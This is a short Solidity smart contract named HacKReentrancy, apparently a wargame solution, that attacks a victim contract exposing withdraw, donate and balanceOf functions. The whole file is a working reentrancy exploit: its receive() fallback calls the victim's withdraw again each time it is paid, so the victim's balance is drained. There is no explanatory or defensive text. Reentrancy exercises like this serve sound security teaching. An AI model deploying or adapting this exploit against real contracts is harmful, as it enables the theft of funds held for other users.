pragma solidity ^0.8.0;

interface IReentrance {
    function withdraw(uint _amount) external;
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns(uint);
}

contract HacKReentrancy {

    IReentrance immutable VICTIM;

    constructor(
        address victim
    ){
        VICTIM = IReentrance(victim);
    }

    function withdraw() external payable {
        // require( VICTIM.balanceOf(address(this)) >= address(VICTIM).balance, "please donate");
        VICTIM.withdraw( VICTIM.balanceOf(address(this)) );
    }
    receive() external payable {
        VICTIM.withdraw(address(VICTIM).balance);
    }
}